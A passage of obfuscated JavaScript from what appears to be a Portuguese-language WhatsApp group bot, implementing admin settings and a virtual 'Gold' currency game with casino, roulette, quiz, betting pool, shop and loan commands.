                      _0x45b108 += "Lista de Contatos ( " + _0x482692 + " ) No Sistema Aluguel:\n\n";
                      for (let _0x33362c of _0x17f294) {
                        let _0x224f60 = _0x33362c.vencimento > _0x5d78e6 ? "Ativo" : "Inativo";
                        let _0x49814f = _0x224f60 === "Ativo" ? _0x34d3c7(_0x33362c.vencimento - _0x5d78e6) : "Expirado";
                        let _0x41da63 = _0x51224b(_0x33362c.vencimento);
                        _0x45b108 += "Nome: " + _0x33362c.nome_ + "\nID: " + _0x33362c.id_gp + "\nStatus: " + _0x224f60 + "\nTempo Restante: " + _0x49814f + "\nData de Vencimento: " + _0x41da63 + "\n-----------------------------------------\n";
                      }
                    }
                  }
                }
                _0x50740b(_0x45b108);
              }
              break;
            case "limitarcmd":
            case "limitarcomando":
            case "limitecmd":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              _0x326cbd[0].Limitar_CMD = !_0x326cbd[0].Limitar_CMD;
              _0x137e44(_0x326cbd);
              _0x50740b(_0x326cbd[0]?.["Limitar_CMD"] ? "Limitador de comandos ativado com sucesso no grupo: " + _0x3baffe : "Limitador de comandos desativado no grupo: " + _0x3baffe);
              break;
            case "tempocmd":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x11e99e.trim()) {
                return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " 120\n60 = 1 minuto\nExemplo que coloquei, com o : " + _0x141936 + "limitarcmd ativo, só podera usar comandos a cada 2 minutos\nBoa sorte.");
              }
              _0x326cbd[0].Limit_tempo = _0x11e99e.trim();
              _0x137e44(_0x326cbd);
              _0x50740b("Tempo limite definido para: " + kyun(_0x11e99e.trim()) + " a cada comando.");
              break;
            case "listlinks":
            case "links":
              try {
                if (!_0xf59944) {
                  return _0x50740b("Este comando é apenas para o meu dono utilizar...");
                }
                LNK = "_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n\n";
                for (_0x3194f3 = 0; _0x3194f3 < recolherLNK.length; _0x3194f3++) {
                  LNK += "Link - " + (_0x3194f3 + 1) + " _- " + recolherLNK[_0x3194f3].Link + "\n\n";
                }
                _0x50740b(LNK);
              } catch (_0x5e69ef) {
                return _0x50740b("Erro");
              }
              break;
            case "recolherlink":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              nescessario.isRecolherLink = !nescessario.isRecolherLink;
              _0x13c255(nescessario);
              _0x50740b(nescessario?.["isRecolherLink"] ? "Sistema de recolher links ativado com sucesso. Agora os links serão armazenados em " + _0x141936 + "listlinks." : "Sistema de recolher links desativado com sucesso.");
              break;
            case "iddogrupo":
            case "idgrupo":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              _0x50740b(_0x346d97);
              break;
            case "cassino":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x33d21e) {
                return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
              }
              var _0x14a230 = _0x326cbd[0].Chances.find(_0x3492dc => _0x3492dc.id === _0x246d48);
              if (_0x14a230?.["cassino"] > 4) {
                return _0x50740b("Sinto muito, você não tem mais chance para usar o cassino hoje, já está 5/5.");
              }
              if (!_0x14a230) {
                _0x14a230.cassino = 1;
              } else {
                _0x14a230.cassino += 1;
              }
              _0x137e44(_0x326cbd);
              var _0x3950ee = ['🙂', '😁', '🙃', '🤡'];
              A_ = [0, 1, 2, 3, 4, 5, 6, 7, 8];
              A_.forEach(function (_0x30ff2e, _0x5ce8f6, _0x5bc70c) {
                A_[_0x5ce8f6] = _0x3950ee[Math.floor(Math.random() * _0x3950ee.length)];
              });
              async function _0x53dca6(_0x5f22cc) {
                _0x50740b("\n★ Roleta do cassino ★\n\n+-----+-----+-----+\n| " + A_[0] + " | " + A_[1] + " | " + A_[2] + " |\n| " + A_[3] + " | " + A_[4] + " | " + A_[5] + " |\n| " + A_[6] + " | " + A_[7] + " | " + A_[8] + " |\n+-----+-----+-----+\n|   🎰   |         |         |\n+-----+-----+-----+\n\n© Resultado: " + _0x5f22cc + "\n\n");
              }
              async function _0x5a5c9b() {
                _0x53dca6("Parabéns, você recebeu 50 Golds, é um belo de um prêmio e uma baita sorte, pegue este prêmio, você é digno 🎉💥");
                _0x3de59a.ADD(_0x246d48, 50);
              }
              if (A_[0] === A_[1] && A_[1] === A_[2] && A_[0] === A_[2]) {
                _0x5a5c9b();
              } else {
                if (A_[3] === A_[4] && A_[4] === A_[5] && A_[3] === A_[5]) {
                  _0x5a5c9b();
                } else {
                  if (A_[6] === A_[7] && A_[7] === A_[8] && A_[6] === A_[8]) {
                    _0x5a5c9b();
                  } else {
                    _0x53dca6("Ah, que pena! Você perdeu, o que resultará na perda de 2 Golds. Mas não fique triste, a premiação por ganhar é de 50 Golds. Um dia você será muito mais rico do que imagina, e isso não se trata apenas de jogos 😉.");
                    _0x3de59a.RM(_0x246d48, 2);
                  }
                }
              }
              break;
            case "sorteiogold":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x33d21e) {
                return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
              }
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (_0x11e99e.match(/[a-z]/i)) {
                return _0x50740b("É apenas números..");
              }
              var _0x697314 = rggold[_0x3befc0].usus;
              var _0x2e122e = _0x697314[Math.floor(Math.random() * _0x697314.length)];
              _0x5dcc57("- Sorteio de " + _0x11e99e.trim() + " Golds, parabéns @" + _0x2e122e.id.split('@')[0] + " 🔥🎉");
              _0x3de59a.ADD(_0x2e122e.id, Math.floor(_0x11e99e.trim()));
              break;
            case "roletadasorte":
            case "roletads":
            case "roletagold":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x33d21e) {
                return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
              }
              if (_0x3de59a.RS_C(_0x246d48, "roletadasorte")) {
                return _0x50740b("Você já usou a roleta hoje, volte amanhã..");
              }
              if (_0x3de59a.RS(_0x246d48, "Golds") <= 25) {
                return _0x50740b("Você não tem golds o suficiente para usar o comando " + (_0x141936 + _0x267d4b) + ", o mínimo de golds que você deve ter é 25.");
              }
              _0x3f309c("~ ATENÇÃO ~\n\nIrei rodar a roleta e um usuário do sistema gold vai ter o azar ou sorte, ele pode ganhar as moedas do usuário: @" + _0x246d48.split('@')[0] + " ou perder, irei rodar a roleta em 5 segundos..");
              var _0xe16596 = Math.floor(Math.random() * rggold[_0x3befc0].usus.map(_0x3bebd5 => _0x3bebd5.id).length);
              var _0x4211c5 = rggold[_0x3befc0].usus[_0xe16596];
              var _0xf05dda = Math.floor(Math.random() * 3);
              var _0x441162 = Math.floor(Math.random() * _0x3de59a.RS(_0x246d48, "Golds"));
              var _0x4c5c95 = Math.floor(Math.random() * _0x4211c5.Golds);
              setTimeout(() => {
                _0x50740b("Roleta girada...");
              }, 5000);
              setTimeout(() => {
                _0x50740b("Humm.. O que será que vai acontecer?? quem vai ter sorte ou não? hehehe");
              }, 7000);
              setTimeout(() => {
                if (_0xf05dda === 1) {
                  _0x3f309c("< Eita.. o usuário @" + _0x246d48.split('@')[0] + " teve o azar na roleta, e teve que enviar " + _0x441162 + " Golds para o @" + _0x4211c5.id.split('@')[0]);
                  _0x3de59a.R_A(_0x246d48, _0x4211c5.id, _0x441162);
                } else {
                  if (_0xf05dda === 2) {
                    _0x3f309c("✓ Parabéns @" + _0x246d48.split('@')[0] + " você teve a sorte de conseguir " + _0x4c5c95 + " Golds dele: @" + _0x4211c5.id.split('@')[0] + " na roleta..");
                    _0x3de59a.R_A(_0x4211c5.id, _0x246d48, _0x4c5c95);
                  } else {
                    _0x50740b("Aaaa, sinto muito.. você não teve sorte na roleta pra obter gold de alguém do grupo..");
                  }
                }
              }, 15000);
              _0x3de59a.ADD_C(_0x246d48, "roletadasorte", true);
              break;
            case "quiznumero":
            case "quiznumerico":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x33d21e) {
                return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
              }
              if (!_0x11e99e.trim()) {
                return _0x50740b("Este comando funciona da seguinte forma: é uma brincadeira com números. Eu irei escolher um número entre 0, 1 e 2, e você tentará adivinhar qual é. Por exemplo: " + (_0x141936 + _0x267d4b) + " 0.\n\nSe você acertar o número que eu escolhi, você ganhará 20 Golds. Você pode ganhar até 2 vezes, e o número que você digitou errado na primeira vez pode ser o que você irá acertar na segunda vez. Boa sorte nisso! 😁");
              }
              if (![0, 1, 2].some(_0xafb20c => _0xafb20c === parseInt(_0x11e99e.trim()))) {
                return _0x50740b("Você tem que escolher um número, um desses ( 0, 1 , 2 ), se o número que você escolher, for o que eu escolhi, você ganhará 20 Golds");
              }
              var _0x58fa19 = _0x326cbd[0].Chances;
              var _0x5a19d2 = _0x58fa19[_0x58fa19.findIndex(_0x2ff3aa => _0x2ff3aa.id == _0x246d48)];
              var _0x54e2bb = Math.floor(Math.random() * 3);
              const _0x386a23 = {
                errou: 0x0,
                acertou: 0x0,
                numero: _0x54e2bb
              };
              if (!_0x5a19d2.quiz) {
                _0x5a19d2.quiz = [_0x386a23];
              } else {
                _0x5a19d2.quiz[0].numero = _0x54e2bb;
              }
              _0x137e44(_0x326cbd);
              if (_0x5a19d2?.["quiz"][0]?.["errou"] > 1) {
                return _0x50740b("Você já errou 2 vezes hoje, só amanhã  poderá utilizar este comando novamente, sinto muito.");
              }
              if (_0x5a19d2?.["quiz"][0]?.["acertou"] > 1) {
                return _0x50740b("Você já acertou 2 vezes hoje, só amanhã você poderá utilizar este comando novamente, parabéns por seus acertos.");
              }
              if (parseInt(_0x11e99e.trim()) !== parseInt(_0x5a19d2.quiz[0].numero)) {
                _0x5a19d2.quiz[0].errou += 1;
                _0x137e44(_0x326cbd);
                _0x50740b("Aaaah não foi dessa vez, você errou o quiz, suas chance está em " + _0x5a19d2.quiz[0].errou + '/2');
              } else {
                _0x3de59a.ADD(_0x246d48, 20);
                _0x5a19d2.quiz[0].acertou += 1;
                _0x137e44(_0x326cbd);
                _0x50740b("Parabéns 🎉💥, você recebeu 20 Golds, e sua chance para executar o comando quiz está em:\n\n- Erros: " + _0x5a19d2.quiz[0].errou + "/2\n\n- Acertos: " + _0x5a19d2.quiz[0].acertou + '/2');
              }
              break;
            case "bolaogold":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x33d21e) {
                return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
              }
              let _0x5f1b33 = 0;
              let _0x439048 = '';
              if (!_0x326cbd[0].bolaogold || _0x326cbd[0].bolaogold.length <= 0) {
                if (!parseInt(_0x11e99e.trim())) {
                  return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " 5\n\nSaiba que não pode apostar mais de 50 no bolão.");
                }
                if (!/^\d+$/.test(_0x11e99e.trim())) {
                  return _0x50740b("Apenas pode digitar números.");
                }
                if (_0x3de59a.RS(_0x246d48, "Golds") < parseInt(_0x11e99e.trim())) {
                  return _0x50740b("Você não tem essa quantidade de gold para iniciar o bolão..");
                }
                if (parseInt(_0x11e99e.trim()) > 50) {
                  return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " 5\n\nSaiba que não pode apostar mais de 50 no bolão.");
                }
                _0x326cbd[0].bolaogold = [{
                  'id': _0x246d48,
                  'aposta': parseInt(_0x11e99e.trim())
                }];
                _0x137e44(_0x326cbd);
                _0x3de59a.RM(_0x246d48, parseInt(_0x11e99e.trim()));
                _0x3f309c("~ ⚔️ Atenção a todos ativos do chat ~\n\nO comando bolão foi iniciado, e a aposta do usuário é de: " + _0x11e99e.trim() + " Golds\n\nPara participardo bolão, digite: " + _0x141936 + "bolaogold\n\no quinto usuário a executar o comando, a roleta será acionada, e um dos usuários ganhará o resultado todo apostado.");
              } else {
                if (_0x326cbd[0].bolaogold.map(_0xc8d12a => _0xc8d12a.id).includes(_0x246d48)) {
                  return _0x50740b("Você já está participando do bolão, aguarde o quinto usuário participar do bolão para a roleta ser acionada e ter o ganhador.");
                }
                if (_0x3de59a.RS(_0x246d48, "Golds") < parseInt(_0x326cbd[0].bolaogold[0].aposta)) {
                  return _0x50740b("Você não tem a quantidade de gold para aplicar no bolão..");
                }
                _0x326cbd[0].bolaogold.push({
                  'id': _0x246d48,
                  'aposta': parseInt(_0x326cbd[0].bolaogold[0].aposta)
                });
                _0x137e44(_0x326cbd);
                _0x5f1b33 = _0x326cbd[0].bolaogold.length * _0x326cbd[0].bolaogold[0].aposta;
                _0x326cbd[0].bolaogold.map(_0x15a34a => {
                  _0x439048 += "- @" + _0x15a34a.id.split('@')[0] + "\n" + '-'.repeat(15) + "\n\n";
                });
                if (_0x326cbd[0].bolaogold.length < 5) {
                  _0x3de59a.RM(_0x246d48, Math.floor(_0x326cbd[0].bolaogold[0].aposta));
                  _0x3f309c("O Bolão agora está valendo: " + _0x5f1b33 + "\n\nParticipantes do bolão ->\n\n" + _0x439048);
                } else {
                  _0x5f1b33 = _0x326cbd[0].bolaogold.length * _0x326cbd[0].bolaogold[0].aposta;
                  _0x3de59a.RM(_0x246d48, Math.floor(_0x326cbd[0].bolaogold[0].aposta));
                  _0x3f309c("O quinto jogador solicitou para participar, em 6 Segundos será anúnciado o ganhador do bolão, no valor de: " + _0x5f1b33 + " Golds, aguardem..");
                  var _0x1ccb95 = _0x326cbd[0].bolaogold.map(_0xdbee71 => _0xdbee71.id)[Math.floor(Math.random() * _0x326cbd[0].bolaogold.map(_0x1230e8 => _0x1230e8.id).length)];
                  setTimeout(() => {
                    _0x3f309c("🔥 O ganhador do bolão é @" + _0x1ccb95.split('@')[0] + " 💥🎉\n\nObrigado a todos que participaram!!");
                    _0x54f0dc(_0x33d21e, _0x5f1b33, _0x1ccb95);
                    _0x326cbd[0].bolaogold = [];
                    _0x137e44(_0x326cbd);
                  }, 6000);
                }
              }
              break;
            case "doargold":
            case "doargolds":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x33d21e) {
                return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
              }
              if (!_0x5e13bf) {
                return _0x50740b("Você deve marcar a mensagem do usuário com " + (_0x141936 + _0x267d4b) + " /10 por exemplo ou " + (_0x141936 + _0x267d4b) + " @xpessoa/10, pode doar a quantidade que tiver e quiser.");
              }
              var [_0x2eb410, _0x17bd1f] = _0x11e99e.trim().split('/');
              var _0x4dd16e = parseInt(_0x17bd1f);
              if (!_0x4dd16e) {
                return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " @xpessoa/5 ou " + (_0x141936 + _0x267d4b) + " /5 marcando a mensagem, lembre que não pode Letras após o /, apenas a quantidade de gold que deseja doar.");
              }
              if (!/^\d+$/.test(_0x17bd1f)) {
                return _0x50740b("Apenas pode digitar números após a /");
              }
              if (_0x5e13bf === _0x246d48) {
                return _0x50740b("Você não pode doar Golds pra si mesmo.");
              }
              var _0x3ce7b = rggold[_0x3befc0].usus;
              if (_0x3de59a.RS(_0x246d48, "Golds") < _0x4dd16e) {
                return _0x50740b("Você não tem ★ " + _0x4dd16e + " Gold(s) ★ para doar, se deseja verificar quantos golds você tem, use o comando: " + _0x141936 + "gold");
              }
              _0x3de59a.R_A(_0x246d48, _0x5e13bf, _0x4dd16e);
              _0x5dcc57("Você doou ★ " + _0x4dd16e + " Gold(s) ★ para o seu amigo ( @" + _0x5e13bf.split('@')[0] + " ), parabéns por sua humildade 👏..");
              break;
            case "comprar":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x33d21e) {
                return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
              }
              var _0x3c9beb = _0x11e99e.trim().toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, '');
              if (_0x3de59a.RS(_0x246d48, "Golds") < 50) {
                return _0x50740b("Você não tem Golds o suficiente para comprar, você tem que ter no mínimo 50 Golds.");
              }
              if (["vingancagold", "cachaca", "escudo"].some(_0x5c70db => _0x5c70db === _0x3c9beb)) {
                var _0x2bc007 = _0x326cbd[0].Chances.find(_0x19f2aa => _0x19f2aa.id === _0x246d48);
                var _0x16c960 = rggold[_0x3befc0].usus;
                if (_0x3c9beb === "vingancagold") {
                  if (_0x2bc007?.["Vinganca"] <= 0) {
                    return _0x50740b("Você tem uma vingançagold ainda pra gastar, se vingue de alguém primeiro pra poder comprar outra.");
                  }
                  let _0x4c663a = "Olá @" + _0x246d48.split('@')[0] + ", você realizou a compra do comando vingançagold, e poderá se vingar de alguém tentando roubar, mas lembre-se, que poderá perder e ganhar, e nessa sua compra, os 50 Golds será doado 10 para 5 usuários aleatórios do grupo.\n« Ganhadores da doação de 10 Golds para cada »";
                  for (_0x3194f3 = 0; _0x3194f3 < 5; _0x3194f3++) {
                    var _0x182c89 = _0x16c960[Math.floor(Math.random() * _0x16c960.length)];
                    _0x4c663a += "\n- [ " + (_0x3194f3 + 1) + " ] ” @" + _0x182c89.id.split('@')[0] + "\n\n";
                    _0x182c89.Golds += 10;
                  }
                  _0x2bc007.Vinganca = 0;
                  _0x5dcc57(_0x4c663a);
                  _0x137e44(_0x326cbd);
                  _0x3de59a.RM(_0x246d48, 50);
                  _0x1564b4(rggold);
                } else {
                  if (_0x3c9beb === "cachaca") {
                    if (_0x2bc007?.["cachacacnt"] !== undefined && _0x2bc007.cachacacnt >= 3) {
                      return _0x50740b("Você já comprou 3 cachaças. Utilize-as antes de comprar mais.");
                    }
                    if (_0x2bc007?.["cachacacnt"] === undefined) {
                      _0x2bc007.cachacacnt = 0;
                    }
                    _0x2bc007.cachacacnt++;
                    if (_0x2bc007?.["Cachaca"] === undefined) {
                      _0x2bc007.Cachaca = 0;
                    }
                    _0x2bc007.Cachaca++;
                    _0x137e44(_0x326cbd);
                    _0x50740b("Você comprou cachaça, você poderá marcar um usuário com o comando: " + _0x141936 + "enviarcachaça @xpessoa, e ele consumirá a bebida, e terá chance de ele derrubar Golds. ( OBS: Essa compra custou 50 Golds )");
                    _0x3de59a.RM(_0x246d48, 50);
                    _0x1564b4(rggold);
                  } else {
                    if (_0x3c9beb === "escudo") {
                      const _0x480808 = {
                        rn: 0x1
                      };
                      _0x2bc007.Escudo = [_0x480808];
                      _0x137e44(_0x326cbd);
                      _0x50740b("Parabéns, você comprou 1 escudo, saiba que se alguém tiver sorte, ele pode quebrar seu escudo, tome cuidado. ( OBS: Essa compra custou 50 Golds )");
                      _0x3de59a.RM(_0x246d48, 50);
                      _0x1564b4(rggold);
                    }
                  }
                }
              } else {
                if (_0x3c9beb === "premium") {
                  if (_0x3de59a.RS(_0x246d48, "Golds") < 5000) {
                    return _0x50740b("Você não tem Golds o suficiente para comprar o Premium, você precisa de no mínimo 5000 Golds.");
                  }
                  _0x3de59a.RM(_0x246d48, 5000);
                  premium.push(_0x246d48);
                  fs.writeFileSync("./DADOS/json/premium.json", JSON.stringify(premium));
                  const _0x5572b3 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, {
                    'text': "Parabéns @" + _0x246d48.split('@')[0] + " você agora faz parte da lista de usuarios premium, valor: 10000 golds."
                  }, _0x5572b3);
                } else {
                  _0x50740b("Por enquanto, você só pode comprar vingança, cachaça, escudo e premium, mas para comprar mais vingança/cachaça/escudo/premium, use o comando por exemplo: " + (_0x141936 + _0x267d4b) + " vingançagold\n\nMas lembre-se que só pode comprar um por vez, e custará 50 Golds, e os 50 Golds seu, será doado para 5 pessoas aleatoriamente do grupo, e lembre também, que na vingança você poderá perder igual o roubo.");
                }
              }
              break;
            case "enviarcachaca":
            case "cachaca":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x33d21e) {
                  return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
                }
                let _0xb92e21 = _0x326cbd[0].Chances.find(_0x27f7dd => _0x27f7dd.id === _0x5e13bf);
                let _0x39300a = _0x326cbd[0].Chances.find(_0x4be971 => _0x4be971.id === _0x246d48);
                if (!_0x5e13bf) {
                  return _0x50740b("Você deve marcar a mensagem do usuário com " + _0x141936 + "enviarcachaça ou " + _0x141936 + "enviarcachaça @xpessoa");
                }
                if ((_0x39300a?.["Cachaca"] || 0) <= 0) {
                  return _0x50740b("Você não tem mais cachaça. Compre mais antes de tentar enviar.");
                }
                var _0x268846 = Math.floor(Math.random() * 4);
                var _0x20da42 = rggold[_0x3befc0].usus.find(_0x49073b => _0x49073b.id === _0x246d48);
                var _0x54c450 = rggold[_0x3befc0].usus.find(_0x42656a => _0x42656a.id === _0x5e13bf);
                if ((_0x54c450?.["Golds"] || 0) <= 0) {
                  return _0x50740b("Este usuário não tem nenhum Gold para você embebedar ele.");
                }
                if ((_0x20da42?.["Golds"] || 0) <= 0) {
                  return _0x50740b("Você não tem nenhum Gold para tentar embebedar ele, como vai pegar o uber? 🤡, ele mora longe.");
                }
                _0x39300a.Cachaca--;
                _0x137e44(_0x326cbd);
                if (_0xb92e21?.["Escudo"]?.["length"] > 0) {
                  let _0x5252be = _0xb92e21.Escudo[0].rn + 1;
                  if (Math.floor(Math.random() * _0x5252be) === 1) {
                    _0x50740b("O usuário estava de escudo, e você conseguiu quebrar, parabéns.");
                    _0x3de59a.ADD_C(_0x5e13bf, "Escudo", []);
                  } else {
                    return _0x50740b("O usuário está de escudo, e você não conseguiu quebrar, você não conseguiu nada, sinto muito.");
                  }
                  _0x137e44(_0x326cbd);
                }
                var _0x3bbaa3 = parseInt(_0x20da42.Golds) > 500 ? Math.floor(Math.random() * 500) : Math.floor(Math.random() * _0x20da42.Golds);
                var _0x5ba65f = parseInt(_0x54c450.Golds) > 500 ? Math.floor(Math.random() * 500) : Math.floor(Math.random() * _0x54c450.Golds);
                if (_0x268846 === 0) {
                  _0x5dcc57("Eita, acho que o usuário @" + _0x5e13bf.split('@')[0] + " é cristão, não quis consumir nenhuma gota 🤡, e você voltou andando para casa sem nada.");
                } else {
                  if (_0x268846 === 1) {
                    _0x5dcc57("O usuário @" + _0x5e13bf.split('@')[0] + " foi esperto. Ele era um ex-alcoólatra e jogou a garrafa em você. Enquanto você corria, perdeu " + _0x3bbaa3 + " Golds. Ele tentou ser honesto, mas você fugiu muito longe. Ele esperou 5 dias para te devolver, mas como você não apareceu, ele ficou com seus Golds.");
                    _0x3de59a.R_A(_0x246d48, _0x5e13bf, _0x3bbaa3);
                  } else {
                    if (_0x268846 === 2) {
                      _0x5dcc57("Eita! O usuário @" + _0x5e13bf.split('@')[0] + " curte uma cachaça 51 e acertou em cheio. Ele consumiu bastante até que derrubou " + _0x5ba65f + " Golds. Parabéns! 🔥 (OBS: Se o usuário tiver mais de 500 Golds, você só conseguirá no máximo 500.)");
                      _0x3de59a.R_A(_0x5e13bf, _0x246d48, _0x5ba65f);
                    } else {
                      if (_0x268846 === 3) {
                        _0x5dcc57("Eita, você estava andando com a cachaça e, quando foi enviar para o @" + _0x5e13bf.split('@')[0] + ", a polícia passou perto e viu que você estava prestes a cometer um crime de roubo. A polícia pediu " + _0x3bbaa3 + " Golds como gorjeta em troca de não te prender, e não te restaram escolhas.");
                        _0x3de59a.RM(_0x246d48, _0x3bbaa3);
                      } else {
                        _0x5dcc57("No caminho de enviar a cachaça para o @" + _0x5e13bf.split('@')[0] + ", você achou 200 Golds, então decidiu voltar para casa com o que já conseguiu, parabéns.");
                        _0x3de59a.ADD(_0x246d48, 200);
                      }
                    }
                  }
                }
              }
              break;
            case "emprestargold":
            case "emprestargolds":
            case "emprestimo":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x33d21e) {
                  return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
                }
                var [_0x2eb410, _0x36850a] = _0x11e99e.trim().split('/');
                if (!/^\d+$/.test(_0x36850a)) {
                  return _0x50740b("Apenas pode digitar números após a /");
                }
                if (_0x5e13bf && _0x36850a) {
                  let _0x1343b3 = rggold[_0x3befc0].usus.find(_0x25dfc0 => _0x25dfc0.id === _0x5e13bf);
                  if (!_0x1343b3.emp_A?.["find"](_0x51e0ce => _0x51e0ce.id === _0x246d48) && _0x1343b3.emp_A?.["length"] > 0) {
                    return _0x50740b("Este usuário já tem uma proposta de empréstimo, ele deve recusar usando o comando " + _0x141936 + "recusaremprestimo para poder aceitar o seu.");
                  }
                  if (!_0x1343b3.emp_G?.["find"](_0x3c0bf8 => _0x3c0bf8.id === _0x246d48) && _0x1343b3.emp_G?.["length"] > 0) {
                    return _0x50740b("Este usuário já tem um empréstimo para pagar, você não pode emprestar para ele.");
                  }
                  if (_0x3de59a.RS(_0x246d48, "Golds") < parseInt(_0x36850a)) {
                    return _0x50740b("Você não tem essa quantidade de Golds para emprestar.");
                  }
                  _0x5dcc57("Olá @" + _0x5e13bf.split('@')[0] + ", O usuário @" + _0x246d48.split('@')[0] + " gostaria de te emprestar " + _0x36850a + " Golds. Caso esteja interessado em aceitar o empréstimo, utilize o seguinte comando: " + _0x141936 + "aceitaremprestimo. Se preferir recusar a oferta, utilize: " + _0x141936 + "recusaremprestimo.\n\nNo caso de aceitar o empréstimo, lembramos que o usuário terá a possibilidade de cobrar você daqui a 1 dia/24 horas, através do comando " + _0x141936 + "cobrargold. Caso possua os golds na data de cobrança, será consumido os Golds dele +15%.\n\nAgradecemos sua atenção e aguardamos sua decisão. Qualquer dúvida, estamos à disposição.");
                  Object.assign(_0x1343b3, {
                    'emp_A': [{
                      'id': _0x246d48,
                      'Golds': parseInt(_0x36850a),
                      'Tempo': 0x0
                    }]
                  });
                  _0x1564b4(rggold);
                } else {
                  return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " @xpessoa/100\n\nassim você estará enviando um empréstimo para o usuário x, e para ele aceitar, ele usa " + _0x141936 + "aceitaremprestimo, caso não quiser, ele pode usar, " + _0x141936 + "recusaremprestimo, o exemplo que coloquei é um empréstimo de 100 Golds, e você receberá 15% quando receber de volta, e para cobrar, você só poderá cobrar daqui a 1 Dia/24 Horas, e o comando é " + _0x141936 + "cobrargold @xpessoa, mas se ele não aceitou o empréstimo, não terá como.");
                }
              }
              break;
            case "aceitaremprestimo":
            case "aceitarproposta":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x33d21e) {
                  return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
                }
                let _0x105c63 = rggold[_0x3befc0].usus.find(_0x4ad4ac => _0x4ad4ac.id === _0x246d48);
                if (_0x105c63?.["emp_A"] && _0x105c63?.["emp_A"]["length"] > 0) {
                  let _0x187ba0 = rggold[_0x3befc0].usus.find(_0x2d6347 => _0x2d6347.id === _0x105c63.emp_A[0]?.['id']);
                  if (Math.floor(_0x187ba0.Golds) < Math.floor(_0x105c63.emp_A[0].Golds)) {
                    return _0x50740b("O usuário não tem mais a quantidade de Golds que era pra te emprestar, você tem que usar o comando de recusar proposta, " + _0x141936 + "recusaremprestimo, sinto muito.");
                  }
                  _0x5dcc57("Olá @" + _0x105c63.emp_A[0].id.split('@')[0] + ", o usuário @" + _0x246d48.split('@')[0] + " aceitou sua proposta de empréstimo.");
                  let _0x3f28e6 = Math.floor(Date.now() / 1000 + 86400);
                  let _0x27e6f9 = Math.floor(_0x105c63.emp_A[0].Golds);
                  _0x187ba0.Golds -= _0x27e6f9;
                  _0x105c63.Golds += _0x27e6f9;
                  Object.assign(_0x105c63, {
                    'emp_G': [{
                      'id': _0x105c63.emp_A[0].id,
                      'Golds': _0x105c63?.["emp_G"]?.["length"] > 0 ? parseInt(_0x105c63.emp_G[0].Golds) + _0x27e6f9 : _0x27e6f9,
                      'Tempo': _0x3f28e6,
                      'cobrou': 0x0
                    }]
                  });
                  _0x105c63.emp_A = [];
                  _0x1564b4(rggold);
                } else {
                  return _0x50740b("Você não tem nenhuma proposta de empréstimo para aceitar.");
                }
              }
              break;
            case "recusaremprestimo":
            case "recusarproposta":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x33d21e) {
                  return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
                }
                let _0x2acbaa = rggold[_0x3befc0].usus.find(_0xbf4f9f => _0xbf4f9f.id === _0x246d48);
                if (_0x2acbaa?.["emp_A"] && _0x2acbaa?.["emp_A"]?.["length"] > 0) {
                  _0x5dcc57('@' + _0x2acbaa.emp_A[0].id.split('@')[0] + ", seu empréstimo foi recusado.");
                  _0x2acbaa.emp_A = [];
                  _0x1564b4(rggold);
                } else {
                  return _0x50740b("Você não tem nenhuma proposta de empréstimo para recusar.");
                }
              }
              break;
            case "pagaremprestimo":
            case "pagargold":
              {
